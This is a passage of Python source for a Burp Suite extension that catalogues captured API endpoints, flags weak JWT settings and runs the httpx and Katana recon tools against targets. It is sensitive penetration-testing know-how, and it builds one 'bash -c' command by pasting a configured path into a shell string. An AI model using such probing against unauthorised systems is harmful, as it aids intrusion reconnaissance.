                tags_snapshot = dict(self.endpoint_tags)

            # Calculate pagination
            total_items = len(filtered)
            self.total_pages = max(1, (total_items + self.page_size - 1) // self.page_size)
            if self.current_page >= self.total_pages:
                self.current_page = max(0, self.total_pages - 1)

            start_idx = self.current_page * self.page_size
            end_idx = min(start_idx + self.page_size, total_items)

            # Update pagination controls
            self.page_label.setText("{}/{}".format(self.current_page + 1, self.total_pages))
            self.prev_page_btn.setEnabled(self.current_page > 0)
            self.next_page_btn.setEnabled(self.current_page < self.total_pages - 1)

            # Batch UI updates - build all items first, then update UI once
            items_to_add = []
            group_by = str(self.group_by.getSelectedItem())

            if group_by == "None":
                sorted_keys = sorted(filtered.keys())
                page_keys = sorted_keys[start_idx:end_idx]
                for key in page_keys:
                    tags = tags_snapshot.get(key, [])
                    tag_str = " [{}]".format(",".join(tags)) if tags else ""
                    entries = filtered[key]
                    entry = self._get_entry(entries)
                    count = len(entries) if isinstance(entries, list) else 1
                    items_to_add.append(
                        "[{}x] {} @ {}{}".format(count, key, entry["host"], tag_str)
                    )
            else:
                groups = self._group_endpoints(filtered, group_by)
                item_count = 0
                for group_name in sorted(groups.keys()):
                    if item_count >= end_idx:
                        break
                    if item_count >= start_idx:
                        items_to_add.append("=== {} ===".format(group_name))
                    item_count += 1
                    for key in sorted(groups[group_name]):
                        if item_count >= end_idx:
                            break
                        if item_count >= start_idx:
                            tags = tags_snapshot.get(key, [])
                            tag_str = " [{}]".format(",".join(tags)) if tags else ""
                            entries = filtered[key]
                            entry = self._get_entry(entries)
                            count = len(entries) if isinstance(entries, list) else 1
                            items_to_add.append(
                                "  [{}x] {} @ {}{}".format(
                                    count, key, entry["host"], tag_str
                                )
                            )
                        item_count += 1

            # Single UI update
            self.list_model.clear()
            for item in items_to_add:
                self.list_model.addElement(item)

        except Exception as e:
            self._callbacks.printError("Refresh view error: " + str(e))

    def _group_endpoints(self, endpoints, group_by):
        groups = {}
        for key, entries in endpoints.items():
            entry = self._get_entry(entries)
            if group_by == "Host":
                group_name = entry["host"]
            elif group_by == "Method":
                group_name = entry["method"]
            elif group_by == "Auth":
                auth = entry["auth_detected"]
                group_name = auth[0] if auth else "None"
            elif group_by == "Encryption":
                enc = entry.get("encryption_indicators", {}).get("likely_encrypted")
                group_name = "Encrypted" if enc else "Plain"
            else:
                group_name = "Other"

            if group_name not in groups:
                groups[group_name] = []
            groups[group_name].append(key)
        return groups

    def _update_tab_title(self):
        """Update tab title with count"""
        count = len(self.api_data)
        self._callbacks.setExtensionName(
            "API Security Suite"
            if count == 0
            else "API Security Suite ({})".format(count)
        )

    def _update_stats(self):
        """Update statistics panel"""
        with self.lock:
            total = len(self.api_data)
            hosts = len(set(self._get_entry(e)["host"] for e in self.api_data.values()))
            severity_counts = {"critical": 0, "high": 0, "medium": 0}
            for key, entries in self.api_data.items():
                sev = self._get_severity(key, entries)
                if sev in severity_counts:
                    severity_counts[sev] += 1

        self.stats_label.setText(
            "Endpoints: {} | Critical: {} | High: {} | Medium: {} | Hosts: {}".format(
                total,
                severity_counts["critical"],
                severity_counts["high"],
                severity_counts["medium"],
                hosts,
            )
        )

    def _update_host_filter(self):
        """Update host filter dropdown"""
        with self.lock:
            hosts = sorted(
                set(self._get_entry(e)["host"] for e in self.api_data.values())
            )
        current = str(self.host_filter.getSelectedItem())
        self.host_filter.removeAllItems()
        self.host_filter.addItem("All")
        for host in hosts:
            self.host_filter.addItem(host)
        if current in hosts or current == "All":
            self.host_filter.setSelectedItem(current)

    def export_by_host(self):
        """Export endpoints for selected host only"""
        host = str(self.host_filter.getSelectedItem())
        if host == "All":
            with self.lock:
                hosts = sorted(
                    set(self._get_entry(e)["host"] for e in self.api_data.values())
                )
            if not hosts:
                self.log_to_ui("[!] No hosts to export")
                return
            host = str(
                JOptionPane.showInputDialog(
                    self._panel,
                    "Select host to export:",
                    "Export Host",
                    JOptionPane.QUESTION_MESSAGE,
                    None,
                    hosts,
                    hosts[0],
                )
            )
            if not host:
                return

        with self.lock:
            filtered_data = {
                k: v
                for k, v in self.api_data.items()
                if self._get_entry(v)["host"] == host
            }
        if not filtered_data:
            self.log_to_ui("[!] No endpoints for host: {}".format(host))
            return

        self.log_to_ui(
            "[*] Exporting {} endpoints for {}".format(len(filtered_data), host)
        )
        self._export_data(filtered_data, "_" + host.replace(".", "_"))

    def import_data(self):
        """Import previously exported JSON"""
        chooser = JFileChooser()
        chooser.setDialogTitle("Import API Security Suite JSON")
        if chooser.showOpenDialog(self._panel) == JFileChooser.APPROVE_OPTION:
            filepath = chooser.getSelectedFile().getAbsolutePath()
            try:
                with open(filepath, "r") as f:
                    data = json.load(f)

                imported = 0
                for endpoint in data.get("endpoints", []):
                    key = endpoint["endpoint"]
                    with self.lock:
                        if key not in self.api_data:
                            # Reconstruct entry with all required fields
                            sample_req = (
                                endpoint.get("sample_requests", [{}])[0]
                                if endpoint.get("sample_requests")
                                else {}
                            )
                            resp_codes = endpoint.get("response_codes", [])
                            content_types = endpoint.get("content_types", [])
                            entry = {
                                "method": endpoint["method"],
                                "path": sample_req.get(
                                    "path", endpoint["normalized_path"]
                                ),
                                "normalized_path": endpoint["normalized_path"],
                                "host": endpoint["host"],
                                "protocol": "https",
                                "port": 443,
                                "query_string": sample_req.get("query", ""),
                                "parameters": endpoint.get(
                                    "parameters",
                                    {"url": {}, "body": {}, "cookie": {}, "json": {}},
                                ),
                                "headers": sample_req.get("headers", {}),
                                "request_body": sample_req.get("request_body", ""),
                                "response_status": resp_codes[0] if resp_codes else 200,
                                "response_headers": {},
                                "response_body": sample_req.get("response_body", ""),
                                "response_length": int(
                                    endpoint.get("avg_response_length", 0)
                                ),
                                "response_time_ms": 0,
                                "content_type": (
                                    content_types[0] if content_types else "unknown"
                                ),
                                "auth_detected": endpoint.get("auth_methods", ["None"]),
                                "api_patterns": endpoint.get("api_patterns", []),
                                "jwt_detected": endpoint.get("jwt_claims"),
                                "encryption_indicators": {
                                    "likely_encrypted": endpoint.get(
                                        "encryption_detected", False
                                    ),
                                    "types": endpoint.get("encryption_types", []),
                                },
                                "param_patterns": {
                                    "reflected": endpoint.get("reflected_params", []),
                                    "param_types": endpoint.get(
                                        "param_type_summary", {}
                                    ),
                                },
                            }

                            self.api_data[key] = [entry]
                            self.endpoint_tags[key] = self._auto_tag(entry)
                            self.endpoint_times[key] = [0]
                            imported += 1

                self.log_to_ui(
                    "[+] Imported {} endpoints from {}".format(imported, filepath)
                )
                SwingUtilities.invokeLater(
                    lambda: self.endpoint_list.getCellRenderer().invalidate_cache()
                )
                SwingUtilities.invokeLater(lambda: self._update_host_filter())
                SwingUtilities.invokeLater(lambda: self._update_stats())
                SwingUtilities.invokeLater(lambda: self.refresh_view())
            except Exception as e:
                self.log_to_ui("[!] Import failed: {}".format(str(e)))
                import traceback

                self._callbacks.printError(traceback.format_exc())

    def _export_data(self, data_to_export, suffix=""):
        """Helper to export data"""
        timestamp = SimpleDateFormat("yyyyMMdd_HHmmss").format(Date())
        analysis = {
            "metadata": {
                "timestamp": timestamp,
                "total_endpoints": len(data_to_export),
                "total_requests": sum(len(v) for v in data_to_export.values()),
            },
            "endpoints": [],
            "api_structure": self._analyze_structure_for(data_to_export),
            "security_observations": self._analyze_security_for(data_to_export),
            "llm_prompt": self._generate_llm_prompt(),
        }

        for endpoint_key, entries in data_to_export.items():
            entry = self._get_entry(entries)
            entries_list = entries if isinstance(entries, list) else [entries]
            endpoint_summary = {
                "endpoint": endpoint_key,
                "method": entry["method"],
                "normalized_path": entry["normalized_path"],
                "host": self._get_entry(entries)["host"],
                "sample_count": len(entries_list),
                "parameters": self._merge_params(entries_list),
                "auth_methods": list(
                    set([a for e in entries_list for a in e["auth_detected"]])
                ),
                "response_codes": list(
                    set([e["response_status"] for e in entries_list])
                ),
                "content_types": list(set([e["content_type"] for e in entries_list])),
                "api_patterns": list(
                    set([p for e in entries_list for p in e["api_patterns"]])
                ),
                "avg_response_length": sum(e["response_length"] for e in entries_list)
                / len(entries_list),
                "avg_response_time_ms": sum(
                    e.get("response_time_ms", 0) for e in entries_list
                )
                / len(entries_list),
                "jwt_claims": entry.get("jwt_detected"),
                "encryption_detected": any(
                    e.get("encryption_indicators", {}).get("likely_encrypted")
                    for e in entries_list
                ),
                "encryption_types": list(
                    set(
                        [
                            t
                            for e in entries_list
                            for t in e.get("encryption_indicators", {}).get("types", [])
                        ]
                    )
                ),
                "reflected_params": list(
                    set(
                        [
                            p
                            for e in entries_list
                            for p in e.get("param_patterns", {}).get("reflected", [])
                        ]
                    )
                ),
                "param_type_summary": self._summarize_param_types(entries_list),
                "sample_requests": [self._format_sample(e) for e in entries_list[:3]],
            }
            analysis["endpoints"].append(endpoint_summary)

        import os

        host_name = suffix.replace("_", "").replace(".", "_") if suffix else ""
        export_dir = self._get_export_dir("HostExport{}".format(host_name))
        if not export_dir:
            self.log_to_ui("[!] Cannot create export directory")
            return
        filename = os.path.join(export_dir, "api_analysis.json")
        writer = None
        try:
            writer = FileWriter(filename)
            writer.write(json.dumps(analysis, indent=2))
            self.log_to_ui(
                "[+] Exported {} endpoints to: {}".format(
                    len(data_to_export), export_dir
                )
            )
        except Exception as e:
            self.log_to_ui("[!] Export failed: {}".format(str(e)))
        finally:
            if writer:
                try:
                    writer.close()
                except Exception as e:
                    self._callbacks.printError("Error closing writer: " + str(e))

    def _analyze_structure_for(self, data):
        """Analyze structure for specific dataset"""
        structure = {
            "api_types": set(),
            "http_methods": set(),
            "auth_methods": set(),
            "base_paths": set(),
        }
        for entries in data.values():
            entries_list = entries if isinstance(entries, list) else [entries]
            for entry in entries_list:
                structure["http_methods"].add(entry["method"])
                structure["auth_methods"].update(entry["auth_detected"])
                structure["api_types"].update(entry["api_patterns"])
                path = entry["normalized_path"]
                if path.startswith("/api/"):
                    structure["base_paths"].add("/api/")
                elif path.startswith("/v1/"):
                    structure["base_paths"].add("/v1/")
        return {k: list(v) for k, v in structure.items()}

    def _analyze_security_for(self, data):
        """Analyze security for specific dataset"""
        observations = []

        # Reuse existing security analysis but on filtered data
        temp_data = self.api_data
        self.api_data = data
        observations = self._analyze_security()
        self.api_data = temp_data

        return observations

    def show_endpoint_details(self, endpoint_key):
        """Show detailed information for selected endpoint"""
        with self.lock:
            if endpoint_key not in self.api_data:
                return
            entries = self.api_data[endpoint_key]
            times = self.endpoint_times.get(endpoint_key, [])

        entries_list = entries if isinstance(entries, list) else [entries]
        times_list = times if isinstance(times, list) else [times]
        severity = self._get_severity(endpoint_key, entries)

        details = []
        details.append("=" * 80)
        details.append("ENDPOINT: {}".format(endpoint_key))
        details.append("Host: {}".format(self._get_entry(entries)["host"]))
        details.append("Severity: {}".format(severity.upper()))
        details.append("Samples: {}".format(len(entries_list)))
        details.append("=" * 80)
        details.append("")

        # Response times
        if times_list:
            avg_time = sum(times_list) / len(times_list)
            details.append(
                "Response Times: Avg={}ms, Min={}ms, Max={}ms".format(
                    int(avg_time), min(times_list), max(times_list)
                )
            )

        # Auth
        auth = list(set([a for e in entries_list for a in e["auth_detected"]]))
        details.append("Authentication: {}".format(", ".join(auth)))

        # Parameters
        params = self._merge_params(entries_list)
        if any(params.values()):
            details.append("")
            details.append("Parameters:")
            for ptype, pnames in params.items():
                if pnames:
                    details.append("  {}: {}".format(ptype, ", ".join(pnames[:10])))

        # Response codes
        codes = list(set([e["response_status"] for e in entries_list]))
        details.append("")
        details.append("Response Codes: {}".format(", ".join(map(str, codes))))

        # Content types
        ctypes = list(set([e["content_type"] for e in entries_list]))
        details.append("Content Types: {}".format(", ".join(ctypes)))

        # Encryption
        enc_types = list(
            set(
                [
                    t
                    for e in entries_list
                    for t in e.get("encryption_indicators", {}).get("types", [])
                ]
            )
        )
        if enc_types:
            details.append("Encryption: {}".format(", ".join(enc_types)))

        # Reflected params
        reflected = list(
            set(
                [
                    p
                    for e in entries_list
                    for p in e.get("param_patterns", {}).get("reflected", [])
                ]
            )
        )
        if reflected:
            details.append("Reflected Parameters: {}".format(", ".join(reflected)))

        # JWT Details
        jwt_data = None
        for e in entries_list:
            if e.get("jwt_detected"):
                jwt_data = e.get("jwt_detected")
                break

        if jwt_data:
            details.append("")
            details.append("-" * 80)
            details.append("JWT TOKEN DETECTED")
            details.append("-" * 80)
            details.append("Location: {}".format(jwt_data.get("location", "Unknown")))
            details.append("")
            details.append("Header:")
            for k, v in jwt_data.get("header", {}).items():
                details.append("  {}: {}".format(k, v))
            details.append("")
            details.append("Payload:")
            for k, v in jwt_data.get("payload", {}).items():
                details.append("  {}: {}".format(k, v))
            details.append("")
            details.append("Signature: {}...".format(jwt_data.get("signature", "")[:50]))
            details.append("")

            # Security analysis
            header = jwt_data.get("header", {})
            payload = jwt_data.get("payload", {})
            alg = header.get("alg", "")

            details.append("Security Analysis:")
            if alg.lower() in ["none", "null"]:
                details.append("  [CRITICAL] Algorithm is 'none' - signature not verified!")
            elif alg.startswith("HS"):
                details.append("  [INFO] HMAC algorithm ({}) - symmetric key".format(alg))
            elif alg.startswith("RS") or alg.startswith("ES"):
                details.append("  [INFO] Asymmetric algorithm ({})".format(alg))

            if "exp" in payload:
                import time
                exp = payload.get("exp")
                if isinstance(exp, (int, long)):
                    if exp < time.time():
                        details.append("  [WARNING] Token is EXPIRED")
                    else:
                        details.append("  [INFO] Token expires: {}".format(exp))
            else:
                details.append("  [WARNING] No expiration claim (exp)")

            if "iat" not in payload:
                details.append("  [WARNING] No issued-at claim (iat)")

            if "sub" not in payload and "user" not in payload and "userId" not in payload:
                details.append("  [INFO] No user identifier found in standard claims")

        # Sample request/response
        details.append("")
        details.append("-" * 80)
        details.append("SAMPLE REQUEST #1:")
        details.append("-" * 80)
        sample = self._get_entry(entries)
        details.append("{} {}".format(sample["method"], sample["path"]))
        if sample.get("query_string"):
            details.append("Query: {}".format(sample["query_string"]))
        details.append("")
        for k, v in list(sample.get("headers", {}).items())[:10]:
            details.append("{}: {}".format(k, str(v)[:100]))
        if sample.get("request_body"):
            details.append("")
            details.append("Body: {}".format(sample["request_body"][:500]))

        details.append("")
        details.append("-" * 80)
        details.append("SAMPLE RESPONSE #1:")
        details.append("-" * 80)
        details.append("Status: {}".format(sample["response_status"]))
        details.append("Length: {} bytes".format(sample["response_length"]))
        if sample.get("response_body"):
            details.append("")
            details.append("Body: {}".format(sample["response_body"][:500]))

        self.details_area.setText("\n".join(details))
        self.details_area.setCaretPosition(0)

    def createMenuItems(self, invocation):
        """Create context menu items"""
        menu_items = ArrayList()

        # Only show menu for requests
        if invocation.getInvocationContext() in [
            invocation.CONTEXT_MESSAGE_EDITOR_REQUEST,
            invocation.CONTEXT_MESSAGE_VIEWER_REQUEST,
        ]:
            messages = invocation.getSelectedMessages()
            if messages and len(messages) > 0:
                menu_item = JMenuItem("Send to API Security Suite")
                menu_item.addActionListener(lambda e: self._send_to_recon(messages[0]))
                menu_items.add(menu_item)

                repeater_item = JMenuItem("Send to Repeater")
                repeater_item.addActionListener(
                    lambda e: self._send_to_repeater(messages[0])
                )
                menu_items.add(repeater_item)

        return menu_items if menu_items.size() > 0 else None

    def _send_to_recon(self, messageInfo):
        """Manually add request to API Security Suite"""
        self.log_to_ui("[*] Manually adding request to API Security Suite...")
        self._process_traffic(messageInfo)

    def _send_to_repeater(self, messageInfo):
        """Send request to Burp Repeater"""
        httpService = messageInfo.getHttpService()
        self._callbacks.sendToRepeater(
            httpService.getHost(),
            httpService.getPort(),
            httpService.getProtocol() == "https",
            messageInfo.getRequest(),
            None,
        )
        self.log_to_ui(
            "[+] Sent to Repeater: {}://{}".format(
                httpService.getProtocol(), httpService.getHost()
            )
        )

    def _send_endpoint_to_repeater(self, endpoint_key):
        """Reconstruct and send endpoint to Repeater"""
        with self.lock:
            if endpoint_key not in self.api_data:
                return
            entries = self.api_data[endpoint_key]
        entry = self._get_entry(entries)

        # Build request line
        path = entry["path"]
        if entry.get("query_string"):
            path += "?" + entry["query_string"]
        request_line = "{} {} HTTP/1.1\r\n".format(entry["method"], path)

        # Build headers
        headers = []
        headers.append("Host: {}".format(entry["host"]))
        for k, v in entry.get("headers", {}).items():
            if k.lower() != "host":
                headers.append("{}: {}".format(k, v))

        # Build full request
        request_str = request_line + "\r\n".join(headers) + "\r\n\r\n"
        if entry.get("request_body"):
            request_str += entry["request_body"]

        request_bytes = self._helpers.stringToBytes(request_str)

        # Send to Repeater
        use_https = entry["protocol"] == "https"
        port = entry["port"]
        if port == -1:
            port = 443 if use_https else 80

        self._callbacks.sendToRepeater(
            entry["host"], port, use_https, request_bytes, endpoint_key
        )
        self.log_to_ui("[+] Sent to Repeater: {}".format(endpoint_key))

    def _build_url(self, entry, include_path=True):
        """Helper to build URL from entry"""
        port = (
            entry["port"]
            if entry["port"] != -1
            else (443 if entry["protocol"] == "https" else 80)
        )
        base = "{}://{}:{}".format(entry["protocol"], entry["host"], port)
        return base + entry["path"] if include_path else base

    def _export_urls_to_file(
        self, export_dir, filename, include_path=True, unique_hosts=False
    ):
        """Helper to export URLs to file"""
        import os

        filepath = os.path.join(export_dir, filename)
        writer = None
        try:
            writer = FileWriter(filepath)
            with self.lock:
                data_snapshot = list(self.api_data.items())
            if unique_hosts:
                hosts = set()
                for key, entries in data_snapshot:
                    url = self._build_url(self._get_entry(entries), False)
                    if url not in hosts:
                        hosts.add(url)
                        writer.write(url + "\n")
            else:
                for _, entries in data_snapshot:
                    writer.write(
                        self._build_url(self._get_entry(entries), include_path) + "\n"
                    )
            return filepath
        finally:
            if writer:
                try:
                    writer.close()
                except Exception as e:
                    self._callbacks.printError(
                        "Error closing file {}: {}".format(filepath, str(e))
                    )

    def _run_tool_async(self, cmd, output_area, result_processor=None):
        """
        Run external tool asynchronously with heartbeat and result processing.
        Fixes hanging UI and missing output issues.
        """
        import subprocess
        import threading
        import time as time_module

        # Helper to identify tool for logging
        tool_name = cmd[0].split("/")[-1] if "/" in cmd[0] else cmd[0]

        def run_thread():
            try:
                cmd_str = " ".join(cmd)
                # Update UI immediately
                SwingUtilities.invokeLater(
                    lambda: output_area.append("[*] Command: {}\n\n".format(cmd_str))
                )
                self.log_to_ui("[*] Running: {}".format(tool_name))

                # Start process
                process = subprocess.Popen(
                    cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )

                start_time = time_module.time()
                timeout = 600  # 10 minutes
                result_count = 0

                SwingUtilities.invokeLater(
                    lambda: output_area.append("[*] Stage: Running...\n")
                )

                # Read output line by line
                while process.poll() is None:
                    elapsed = int(time_module.time() - start_time)
                    if elapsed > timeout:
                        try:
                            process.kill()
                            process.wait()
                        except Exception as e:
                            self._callbacks.printError("Process kill failed: {}".format(str(e)))
                        SwingUtilities.invokeLater(
                            lambda: output_area.append(
                                "\n[!] Timeout after {}s\n".format(timeout)
                            )
                        )
                        return

                    line = process.stdout.readline()
                    if line:
                        if not isinstance(line, str):
                            try:
                                line = line.decode("utf-8", errors="ignore")
                            except Exception:
                                line = str(line)
                        if line.strip():
                            # Strip ANSI escape codes using pre-compiled pattern
                            clean_line = self.ANSI_ESCAPE_PATTERN.sub("", line)
                            result_count += 1
                            SwingUtilities.invokeLater(
                                lambda l=clean_line: output_area.append(l)
                            )
                    else:
                        time_module.sleep(0.1)

                # Read remaining and wait for process
                remaining = process.stdout.read()
                process.wait()
                if remaining:
                    if not isinstance(remaining, str):
                        try:
                            remaining = remaining.decode("utf-8", errors="ignore")
                        except Exception:
                            remaining = str(remaining)
                    if remaining.strip():
                        SwingUtilities.invokeLater(
                            lambda r=remaining: output_area.append(r)
                        )

                stderr = process.stderr.read()
                if stderr and not isinstance(stderr, str):
                    try:
                        stderr = stderr.decode("utf-8", errors="ignore")
                    except Exception:
                        stderr = str(stderr)

                total_time = int(time_module.time() - start_time)

                # Append STDERR to UI
                if stderr and stderr.strip():
                    final_err = (
                        stderr[:5000] + "...(truncated)"
                        if len(stderr) > 5000
                        else stderr
                    )
                    SwingUtilities.invokeLater(
                        lambda e=final_err: output_area.append(
                            "\n[STDERR]\n" + e + "\n"
                        )
                    )

                if result_count == 0:
                    SwingUtilities.invokeLater(
                        lambda: output_area.append(
                            "\n[!] Complete: {}s | No results (target may be slow/unreachable)\n".format(
                                total_time
                            )
                        )
                    )
                    self.log_to_ui(
                        "[!] {}: {}s, no results".format(tool_name, total_time)
                    )
                else:
                    SwingUtilities.invokeLater(
                        lambda: output_area.append(
                            "\n[+] Complete: {}s | {} results\n".format(
                                total_time, result_count
                            )
                        )
                    )
                    self.log_to_ui(
                        "[+] {}: {}s, {} results".format(
                            tool_name, total_time, result_count
                        )
                    )

                # Trigger result processor (file reading)
                if result_processor:
                    SwingUtilities.invokeLater(result_processor)

            except Exception as e:
                err_msg = str(e)
                SwingUtilities.invokeLater(
                    lambda: output_area.append(
                        "\n[!] Critical Error: {}\n".format(err_msg)
                    )
                )
                self.log_to_ui("[!] {} error: {}".format(tool_name, err_msg))
                print(err_msg)  # Print to Burp console for debugging

        # Start the thread
        t = threading.Thread(target=run_thread)
        t.daemon = True
        t.start()

    def _process_file_results(self, output_file, output_area):
        """
        Generic helper to read output files and display them in the UI.
        """
        import os

        try:
            if not os.path.exists(output_file):
                output_area.append(
                    "\n[!] Expected output file not found: {}\n".format(output_file)
                )
                return

            with open(output_file, "r") as f:
                lines = [l.strip() for l in f.readlines() if l.strip()]

            count = len(lines)

            summary = "\n" + "=" * 60 + "\n"
            summary += " RESULT SUMMARY\n"
            summary += "=" * 60 + "\n"
            summary += "[+] File: {}\n".format(output_file)
            summary += "[+] Total Results Found: {}\n".format(count)

            if count > 0:
                summary += "\n--- First 20 Results ---\n"
                summary += "\n".join(lines[:20])
                if count > 20:
                    summary += "\n... ({} more results in file)".format(count - 20)
            else:
                summary += "\n[!] No results found in output file.\n"

            summary += "\n" + "=" * 60 + "\n"
            output_area.append(summary)

        except Exception as e:
            output_area.append(
                "\n[!] Error processing results file: {}\n".format(str(e))
            )

    def _export_httpx_urls(self):
        """Export URLs for HTTPX probing - only saves when user clicks Export"""
        import os

        if not self.api_data:
            self.httpx_area.setText("[!] No endpoints to export\n")
            return
        export_dir = self._get_export_dir("HTTPX_Export")
        if not export_dir:
            return
        try:
            filepath = self._export_urls_to_file(export_dir, "urls.txt")
            self.httpx_area.setText(
                "[+] Exported {} URLs\n[+] File: {}\n[+] Folder: {}\n".format(
                    len(self.api_data), filepath, export_dir
                )
            )
            self.log_to_ui("[+] Exported HTTPX URLs to: {}".format(export_dir))
        except Exception as e:
            self.httpx_area.append("[!] Export failed: {}\n".format(str(e)))

    def _clean_url(self, url):
        r"""Remove \n\t and other unwanted characters from URL"""
        return re.sub(r"[\n\t\r]", "", url.strip())

    def _run_httpx(self, event):
        """Run HTTPX probe on endpoints from Recon tab"""
        import os
        import subprocess
        import tempfile
        import threading
        import time as time_module

        httpx_path = self.httpx_path_field.getText().strip()
        if not httpx_path:
            self.httpx_area.setText("[!] Configure HTTPX path first\n")
            return
        if not self.api_data:
            self.httpx_area.setText(
                "[!] No endpoints in Recon tab. Capture or import first\n"
            )
            return

        # Use temp directory instead of auto-saving
        temp_dir = tempfile.mkdtemp(prefix="burp_httpx_")
        urls_file = os.path.join(temp_dir, "urls.txt")

        # Export all URLs to file with cleaning
        writer = None
        try:
            writer = FileWriter(urls_file)
            with self.lock:
                target_count = len(self.api_data)
                for entries in self.api_data.values():
                    raw_url = self._build_url(self._get_entry(entries), True)
                    clean_url = self._clean_url(raw_url)
                    writer.write(clean_url + "\n")
        finally:
            if writer:
                writer.close()

        self.httpx_area.setText("[*] Initializing HTTPX...\n")
        self.httpx_area.append("[*] Targets: {} URLs\n".format(target_count))
        self.log_to_ui("[*] HTTPX: Starting scan on {} URLs".format(target_count))

        def run_scan():
            try:
                cmd = [
                    "bash",
                    "-c",
                    "cat {} | {} -status-code -nc".format(urls_file, httpx_path),
                ]
                SwingUtilities.invokeLater(
                    lambda: self.httpx_area.append(
                        "[*] Command: {}\n\n".format(" ".join(cmd))
                    )
                )

                start_time = time_module.time()
                process = subprocess.Popen(
                    cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=1, shell=False
                )

                # Collect results grouped by status
                results_by_status = {'2xx': [], '3xx': [], '4xx': [], '5xx': []}
                last_update = start_time

                while True:
                    line = process.stdout.readline()
                    if not line:
                        if process.poll() is not None:
                            break
                        current_time = time_module.time()
                        if current_time - last_update > 2:
                            elapsed = int(current_time - start_time)
                            SwingUtilities.invokeLater(
                                lambda e=elapsed: self.httpx_area.append(
                                    "[*] Running: {}s...\n".format(e)
                                )
                            )
                            last_update = current_time
                        time_module.sleep(0.1)
                        continue

                    clean_line = re.sub(r"\x1b\[[0-9;]*[mK]", "", line).strip()
                    if clean_line and "http" in clean_line and "[" in clean_line:
                        try:
                            status = clean_line[clean_line.rfind('[')+1:clean_line.rfind(']')]
                            if status.startswith('2'):
                                results_by_status['2xx'].append(clean_line)
                            elif status.startswith('3'):
                                results_by_status['3xx'].append(clean_line)
                            elif status.startswith('4'):
                                results_by_status['4xx'].append(clean_line)
                            elif status.startswith('5'):
                                results_by_status['5xx'].append(clean_line)
                        except Exception as parse_err:
                            self._callbacks.printError(
                                "HTTPX status parse error: {}".format(str(parse_err))
                            )

                process.wait()
                elapsed = int(time_module.time() - start_time)
                total_count = sum(len(v) for v in results_by_status.values())

                # Build grouped output
                output = []
                output.append("="*80)
                output.append("HTTPX PROBE RESULTS")
                output.append("="*80)
                output.append("")
                output.append("[*] Scan Time: {}s".format(elapsed))
                output.append("[*] Total URLs: {}".format(total_count))
                output.append("")

                category_names = {
                    '2xx': 'SUCCESS (2xx)',
                    '3xx': 'REDIRECTS (3xx)',
                    '4xx': 'CLIENT ERRORS (4xx)',
                    '5xx': 'SERVER ERRORS (5xx)'
                }

                for category in ['2xx', '3xx', '4xx', '5xx']:
                    urls = results_by_status[category]
                    if urls:
                        output.append("="*80)
                        output.append("{} - {} URLs".format(category_names[category], len(urls)))
                        output.append("="*80)
                        for url in urls[:10]:
                            output.append(url)
                        if len(urls) > 10:
                            output.append("... ({} more)".format(len(urls) - 10))
                        output.append("")

                output.append("="*80)
                output.append("SUMMARY")
                output.append("="*80)
                for category in ['2xx', '3xx', '4xx', '5xx']:
                    urls = results_by_status[category]
                    if urls and total_count > 0:
                        pct = int((len(urls) / float(total_count)) * 100)
                        output.append("[+] {}: {} ({}%)".format(
                            category_names[category].split(' ')[0], len(urls), pct
                        ))

                output.append("")
                output.append("[*] Key Findings:")
                if results_by_status['4xx']:
                    output.append("    - Review {} 4xx responses for client errors".format(len(results_by_status['4xx'])))
                if results_by_status['5xx']:
                    output.append("    - Investigate {} 5xx responses for server issues".format(len(results_by_status['5xx'])))
                if results_by_status['2xx'] and total_count > 0:
                    success_rate = int((len(results_by_status['2xx']) / float(total_count)) * 100)
                    output.append("    - {}% success rate indicates {} endpoints".format(
                        success_rate, "healthy" if success_rate > 80 else "problematic"
                    ))
                output.append("="*80)

                summary = "\n".join(output)
                SwingUtilities.invokeLater(lambda: self.httpx_area.append(summary))
                SwingUtilities.invokeLater(
                    lambda: self.log_to_ui(
                        "[+] HTTPX: {}s, {} responses".format(elapsed, total_count)
                    )
                )
            except Exception as e:
                err = "[!] Error: {}\n".format(str(e))
                SwingUtilities.invokeLater(lambda: self.httpx_area.append(err))
                SwingUtilities.invokeLater(
                    lambda: self.log_to_ui("[!] HTTPX error: {}".format(str(e)))
                )
            finally:
                try:
                    import shutil
                    shutil.rmtree(temp_dir, ignore_errors=True)
                except Exception as e:
                    self._callbacks.printError("Cleanup error: {}".format(str(e)))

        thread = threading.Thread(target=run_scan)
        thread.daemon = True
        thread.start()

    def _export_list_to_file(self, data_list, export_type, output_area, list_name):
        """Helper to export list to file - only called on explicit export"""
        import os

        if not data_list:
            output_area.append("\n[!] No {} to export\n".format(list_name))
            return
        export_dir = self._get_export_dir(export_type)
        if not export_dir:
            return
        filepath = os.path.join(export_dir, "results.txt")
        writer = None
        try:
            writer = FileWriter(filepath)
            for item in data_list:
                writer.write(item + "\n")
            output_area.append(
                "\n[+] Exported {} {}\n[+] Folder: {}\n[+] File: {}\n".format(
                    len(data_list), list_name, export_dir, filepath
                )
            )
            self.log_to_ui("[+] Exported {} to: {}".format(list_name, export_dir))
        except Exception as e:
            output_area.append("\n[!] Export failed: {}\n".format(str(e)))
            self.log_to_ui("[!] Export error: {}".format(str(e)))
        finally:
            if writer:
                try:
                    writer.close()
                except Exception as e:
                    self._callbacks.printError(
                        "Error closing file {}: {}".format(filepath, str(e))
                    )

    def _export_katana_results(self):
        """Export Katana discovered endpoints - only saves when user clicks Export"""
        with self.katana_lock:
            data = list(self.katana_discovered)
        self._export_list_to_file(
            data, "Katana_Export", self.katana_area, "discovered URLs"
        )

    def _import_katana_to_recon(self):
        """Import Katana discovered endpoints to Recon tab"""
        with self.katana_lock:
            urls = list(self.katana_discovered)
        if not urls:
            self.katana_area.append(
                "\n[!] No discovered endpoints. Run crawler first\n"
            )
            return

        imported = 0
        for url in urls:
            try:
                # Ensure URL has protocol
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url

                parsed = URL(url)
                method = "GET"
                path = parsed.getPath() or "/"
                normalized = self._normalize_path(path)
                key = "{}:{}".format(method, normalized)

                with self.lock:
                    if key not in self.api_data:
                        protocol = parsed.getProtocol() or "http"
                        port = parsed.getPort()
                        if port == -1:
                            port = 443 if protocol == "https" else 80

                        entry = {
                            "method": method,
                            "path": path,
                            "normalized_path": normalized,
                            "host": parsed.getHost(),
                            "protocol": protocol,
                            "port": port,
                            "query_string": parsed.getQuery() or "",
                            "parameters": {
                                "url": {},
                                "body": {},
                                "cookie": {},
                                "json": {},
                            },
                            "headers": {},
                            "request_body": "",
                            "response_status": 200,
